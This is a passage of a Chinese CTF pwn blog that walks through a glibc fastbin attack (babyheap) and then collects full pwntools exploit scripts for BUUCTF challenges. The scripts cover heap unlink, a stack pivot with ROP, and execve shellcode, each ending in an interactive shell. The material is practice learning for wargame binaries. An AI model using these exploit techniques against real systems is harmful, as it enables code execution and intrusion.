title="我们通过chunk0进行堆溢出，使chunk1-&gt;chunk5"></a>我们通过chunk0进行堆溢出，使chunk1-&gt;chunk5</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload=p64(0)*3+p64(0x21)+p8(0x80)</span><br><span class="line">pause()</span><br><span class="line">fill(0,len(payload),payload)</span><br></pre></td></tr></table></figure><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111954727.png" alt="4-6"></p><h4 id="我们再把chun5的size改为0x20，不让接下来无法把重新申请回来"><a href="#我们再把chun5的size改为0x20，不让接下来无法把重新申请回来" class="headerlink" title="我们再把chun5的size改为0x20，不让接下来无法把重新申请回来"></a>我们再把chun5的size改为0x20，不让接下来无法把重新申请回来</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload1=b&#x27;a&#x27;*0x10+p64(0)+p64(0x21)</span><br><span class="line">pause()</span><br><span class="line">fill(3,len(payload1),payload1)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">allo(0x10)</span><br><span class="line"></span><br><span class="line">allo(0x10)</span><br></pre></td></tr></table></figure><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111954728.png" alt="4-7"></p><p>我们要找到这些堆快的返回地址储存再哪</p><p>vmmap看一下</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111954729.png" alt="4-8"></p><p>第一个段有异常，硬找</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111954730.png" alt="4-9"></p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111954731.png" alt="4-10"></p><p>找到了</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111954732.png" alt="4-11"></p><p>两边进行对照，发现chunk2的返回地址被改写成了我们chunk4的</p><h4 id="改回chunk4的大小，并释放"><a href="#改回chunk4的大小，并释放" class="headerlink" title="改回chunk4的大小，并释放"></a>改回chunk4的大小，并释放</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload1=b&#x27;a&#x27;*0x10+p64(0)+p64(0x91)</span><br><span class="line">pause()</span><br><span class="line">fill(3,len(payload1),payload1)</span><br><span class="line"></span><br><span class="line">free(4)</span><br></pre></td></tr></table></figure><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111954733.png" alt="4-12"></p><p>这是，虽然我们chunk4的地址被释放了，不能使用，但是我们chunk2 也是指向我们chunk4地址的</p><h4 id="利用题目的打印函数，获得泄露的地址"><a href="#利用题目的打印函数，获得泄露的地址" class="headerlink" title="利用题目的打印函数，获得泄露的地址"></a>利用题目的打印函数，获得泄露的地址</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">dump(2)</span><br><span class="line"></span><br><span class="line">leak_addr = u64(p.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8, b&#x27;\x00&#x27;))</span><br><span class="line">print(hex((leak_addr)))</span><br><span class="line"></span><br><span class="line">unsorted_offset_addr=unsorted_offset_arena(5)</span><br><span class="line">print(hex(int(unsorted_offset_addr)))</span><br><span class="line">libc_base=leak_addr-unsorted_offset_addr-0x3c4b20</span><br><span class="line"></span><br><span class="line">print(hex(int(libc_base)))</span><br></pre></td></tr></table></figure><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111954734.png" alt="4-13"></p><p>利用main_arena里面unsortedbin的偏移使固定的，找到这里的地址和main_arena的差，再利用main_arena与libc基址有个固定的差值，计算得到libc的基址</p><h4 id="申请回unsortedbin-并改成fatsbin的大小后释放，使其进入fastbin的链表"><a href="#申请回unsortedbin-并改成fatsbin的大小后释放，使其进入fastbin的链表" class="headerlink" title="申请回unsortedbin 并改成fatsbin的大小后释放，使其进入fastbin的链表"></a>申请回unsortedbin 并改成fatsbin的大小后释放，使其进入fastbin的链表</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allo(0x60)</span><br><span class="line">free(4)</span><br></pre></td></tr></table></figure><h4 id="接着我们要找一个可以伪造chunk的地址"><a href="#接着我们要找一个可以伪造chunk的地址" class="headerlink" title="接着我们要找一个可以伪造chunk的地址"></a>接着我们要找一个可以伪造chunk的地址</h4><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111954735.png" alt="4-14"></p><p>因为我们的目的是改掉malloc这里的地址，所以我们要在这个附近找到一个可以改写这个地址的chunk</p><p>我们使用find_fake_fast这个工具来找(find_fake_fast+被写入地址+chunk大小)</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111954736.png" alt="4-15"></p><p>找到了，并且计算偏移</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">print(hex(int(libc_base+0x3c4aed)))</span><br><span class="line"></span><br><span class="line">payload=p64(int(libc_base+0x3c4aed))#0x3c4aed</span><br></pre></td></tr></table></figure><p>因为chunk2是指向chunk4的地址的，我们通过这里改写chunk4的fd地址，使我们伪造的chunk进入fastbin中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fill(2,len(payload),payload)</span><br></pre></td></tr></table></figure><h4 id="申请两个chunk，使我们可以利用伪造的chunk"><a href="#申请两个chunk，使我们可以利用伪造的chunk" class="headerlink" title="申请两个chunk，使我们可以利用伪造的chunk"></a>申请两个chunk，使我们可以利用伪造的chunk</h4><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111954737.png" alt="4-16"></p><p>可以看到我们chunk6的位置是 我们伪造的chunk</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111954738.png" alt="4-17"></p><p>通过计算偏移，讲malloc的位置写入one_gadget</p><p>最后随便malloc触发one_gadget</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gadgets=int(libc_base+0x4526a)</span><br><span class="line">payload =b&#x27;a&#x27;*0x13 + p64(gadgets)</span><br><span class="line"></span><br><span class="line">fill(6, len(payload), payload)</span><br><span class="line"></span><br><span class="line">allo(255)</span><br><span class="line">p.interacti</span><br></pre></td></tr></table></figure><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]</span><br><span class="line">context(log_level=&#x27;debug&#x27;)</span><br><span class="line">#p=remote(&#x27;node5.buuoj.cn&#x27;,25676)</span><br><span class="line">p=process(&#x27;./babyheap&#x27;)</span><br><span class="line">def debug():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">def allo(size):</span><br><span class="line">    p.recvuntil(b&#x27;Command:&#x27;)</span><br><span class="line">    p.sendline(b&#x27;1&#x27;)</span><br><span class="line">    p.sendlineafter(b&#x27;Size:&#x27;,str(size))</span><br><span class="line"></span><br><span class="line">def fill(index,size,content):</span><br><span class="line">    p.recvuntil(b&#x27;Command:&#x27;)</span><br><span class="line">    p.sendline(b&#x27;2&#x27;)</span><br><span class="line">    p.sendlineafter(b&#x27;Index:&#x27;,str(index))</span><br><span class="line">    p.sendlineafter(b&#x27;Size:&#x27;,str(size))</span><br><span class="line">    p.sendafter(b&#x27;Content:&#x27;,content)</span><br><span class="line"></span><br><span class="line">def free(index):</span><br><span class="line">    p.recvuntil(b&#x27;Command:&#x27;)</span><br><span class="line">    p.sendline(b&#x27;3&#x27;)</span><br><span class="line">    p.sendlineafter(b&#x27;Index:&#x27;,str(index))</span><br><span class="line"></span><br><span class="line">def dump(index):</span><br><span class="line">    p.recvuntil(b&#x27;Command:&#x27;)</span><br><span class="line">    p.sendline(b&#x27;4&#x27;)</span><br><span class="line">    p.sendlineafter(b&#x27;Index:&#x27;,str(index))</span><br><span class="line">    p.recvuntil(b&#x27;Content:&#x27;)</span><br><span class="line"></span><br><span class="line">def exit():</span><br><span class="line">    p.recvuntil(b&#x27;Command: \n&#x27;)</span><br><span class="line">    p.sendline(b&#x27;5&#x27;)</span><br><span class="line"></span><br><span class="line">def unsorted_offset_arena(idx):</span><br><span class="line">    word_bytes = context.word_size / 8</span><br><span class="line">    offset = 4  # lock</span><br><span class="line">    offset += 4  # flags</span><br><span class="line">    offset += word_bytes * 10  # offset fastbin</span><br><span class="line">    offset += word_bytes * 2  # top,last_remainder</span><br><span class="line">    offset += idx * 2 * word_bytes  # idx</span><br><span class="line">    offset -= word_bytes * 2  # bin overlap</span><br><span class="line">    return offset</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">allo(0x10)</span><br><span class="line">allo(0x10)</span><br><span class="line">allo(0x10)</span><br><span class="line">allo(0x10)</span><br><span class="line">allo(0x80)</span><br><span class="line">allo(0x70)</span><br><span class="line">debug()</span><br><span class="line">free(2)</span><br><span class="line"></span><br><span class="line">free(1)</span><br><span class="line"></span><br><span class="line">payload=p64(0)*3+p64(0x21)+p8(0x80)</span><br><span class="line">pause()</span><br><span class="line">fill(0,len(payload),payload)</span><br><span class="line"></span><br><span class="line">payload1=b&#x27;a&#x27;*0x10+p64(0)+p64(0x21)</span><br><span class="line">pause()</span><br><span class="line">fill(3,len(payload1),payload1)</span><br><span class="line"></span><br><span class="line">allo(0x10)</span><br><span class="line"></span><br><span class="line">allo(0x10)</span><br><span class="line"></span><br><span class="line">payload1=b&#x27;a&#x27;*0x10+p64(0)+p64(0x91)</span><br><span class="line">pause()</span><br><span class="line">fill(3,len(payload1),payload1)</span><br><span class="line"></span><br><span class="line">free(4)</span><br><span class="line"></span><br><span class="line">dump(2)</span><br><span class="line">pause()</span><br><span class="line">leak_addr = u64(p.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8, b&#x27;\x00&#x27;))</span><br><span class="line">print(hex((leak_addr)))</span><br><span class="line"></span><br><span class="line">unsorted_offset_addr=unsorted_offset_arena(5)</span><br><span class="line">print(hex(int(unsorted_offset_addr)))</span><br><span class="line">libc_base=leak_addr-unsorted_offset_addr-0x3c4b20</span><br><span class="line"></span><br><span class="line">print(hex(int(libc_base)))</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">allo(0x60)</span><br><span class="line">free(4)</span><br><span class="line">print(hex(int(libc_base+0x3c4aed)))</span><br><span class="line"></span><br><span class="line">payload=p64(int(libc_base+0x3c4aed))#0x3c4aed</span><br><span class="line"></span><br><span class="line">fill(2,len(payload),payload)</span><br><span class="line"></span><br><span class="line">allo(0x60)</span><br><span class="line">allo(0x60)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">gadgets=int(libc_base+0x4526a)</span><br><span class="line">payload =b&#x27;a&#x27;*0x13 + p64(gadgets)</span><br><span class="line"></span><br><span class="line">fill(6, len(payload), payload)</span><br><span class="line"></span><br><span class="line">allo(255)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="参考的大佬的博客"><a href="#参考的大佬的博客" class="headerlink" title="参考的大佬的博客"></a>参考的大佬的博客</h2><p><a href="https://blog.csdn.net/qq_41202237/article/details/109284167">好好说话之Fastbin Attack（2）：House Of Spirit_fastbin attack house of spirit-CSDN博客</a></p><p><a href="https://blog.csdn.net/qq_41202237/article/details/111300546">好好说话之Fastbin Attack（3）：Alloc to Stack_large bin attack-CSDN博客</a></p><p><a href="https://blog.csdn.net/qq_41202237/article/details/112320919">好好说话之Fastbin Attack（4）：Arbitrary Alloc_好好说话 ctf-CSDN博客</a></p><p><a href="https://www.cnblogs.com/haidragon/p/17016393.html">lctf2016_pwn200 堆利用 - syscallwww - 博客园 (cnblogs.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> pwn-堆学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buu刷题脚本</title>
      <link href="/posts/44270.html"/>
      <url>/posts/44270.html</url>
      
        <content type="html"><![CDATA[<h1 id="第二页"><a href="#第二页" class="headerlink" title="第二页"></a>第二页</h1><h2 id="ZJCTF-2019-EasyHeap"><a href="#ZJCTF-2019-EasyHeap" class="headerlink" title="[ZJCTF 2019]EasyHeap"></a>[ZJCTF 2019]EasyHeap</h2><p>这里有几个点，首先要用ret把栈的地址叠高，这样防止exp覆盖函数原来的数据</p><p>第二个就是</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">27294</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]+<span class="number">0x16</span></span><br><span class="line">system_plt = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Size of Heap : &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Content of heap:&#x27;</span>,content)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;SuccessFul&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Size of Heap : &#x27;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(content)))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Content of heap :&#x27;</span>,content)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Done !&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    <span class="comment">#p.recvuntil(b&#x27;Done !&#x27;)</span></span><br><span class="line"></span><br><span class="line">bss=<span class="number">0x6020E0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;bbbb&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">b&#x27;cccc&#x27;</span>)</span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(<span class="number">0x81</span>)+p64(bss-<span class="number">0x18</span>)+p64(bss-<span class="number">0x10</span>)+<span class="string">b&#x27;M&#x27;</span>*(<span class="number">0x80</span>-<span class="number">0x20</span>)</span><br><span class="line">payload+=p64(<span class="number">0x80</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">pause()</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload2=p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">payload2+=p64(free_got)+p64(puts_got)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,payload2)</span><br><span class="line">payload1=p64(system_plt)</span><br><span class="line">edit(<span class="number">0</span>,payload1)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">leak=u64(p.recvuntil(&#x27;\x7f&#x27;)[-6:]+b&#x27;\x00\x00&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">print(hex(leak))</span></span><br><span class="line"><span class="string">libc_addr=leak-libc.sym[&#x27;puts&#x27;]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">system=libc_addr+libc.sym[&#x27;system&#x27;]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">payload=p64(system)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">edit(0,payload)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">delete(3)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="gyctf-2020-borrowstack"><a href="#gyctf-2020-borrowstack" class="headerlink" title="gyctf_2020_borrowstack"></a>gyctf_2020_borrowstack</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">25450</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">leave_ret=<span class="number">0x400699</span></span><br><span class="line">pop_rdi=<span class="number">0x0000000000400703</span></span><br><span class="line">bss=<span class="number">0x601080</span></span><br><span class="line">ret=<span class="number">0x4004c9</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shell=<span class="number">0x4526a</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">main = elf.sym[<span class="string">&quot;main&quot;</span>]</span><br><span class="line">puts_plt= elf.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x60</span>+p64(bss)+p64(leave_ret)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload2=p64(ret)*<span class="number">28</span>+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)</span><br><span class="line">p.send(payload2)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Done!You can check and use your borrow stack now!\n&#x27;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>)+<span class="string">b&#x27;\x00\x00&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(leak_addr))</span><br><span class="line"></span><br><span class="line">libc_base=leak_addr-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">shell+=libc_base</span><br><span class="line"></span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x68</span>+p64(shell)</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="ciscn-2019-s-9"><a href="#ciscn-2019-s-9" class="headerlink" title="ciscn_2019_s_9"></a>ciscn_2019_s_9</h2><p>call esp</p><p>jmp esp都行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">27684</span>)</span><br><span class="line"><span class="comment">#p=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shellcode=asm(<span class="string">&#x27;&#x27;&#x27;push 0x68</span></span><br><span class="line"><span class="string">push 0x732f2f2f</span></span><br><span class="line"><span class="string">push 0x6e69622f</span></span><br><span class="line"><span class="string">mov ebx,esp</span></span><br><span class="line"><span class="string">xor edx,edx</span></span><br><span class="line"><span class="string">xor ecx,ecx</span></span><br><span class="line"><span class="string">push 0xB</span></span><br><span class="line"><span class="string">pop eax</span></span><br><span class="line"><span class="string">int 0x80&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=shellcode</span><br><span class="line">payload=payload.ljust(<span class="number">0x24</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="comment">#payload+=asm(&quot;sub esp, 40;&quot;).ljust(0x4,b&#x27;\x90&#x27;)</span></span><br><span class="line">payload+=p32(<span class="number">0x8048554</span>)</span><br><span class="line">payload+=asm(<span class="string">&quot;sub esp,40;jmp esp&quot;</span>)</span><br><span class="line"><span class="comment">#payload+=asm(&quot;sub esp,40;call esp&quot;)</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="第三页"><a href="#第三页" class="headerlink" title="第三页"></a>第三页</h1><h2 id="ciscn-2019-n-3"><a href="#ciscn-2019-n-3" class="headerlink" title="ciscn_2019_n_3"></a>ciscn_2019_n_3</h2><p>虽然是2.27版本的，但是漏洞利用与2.23一致，一个经典的uaf改写地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span 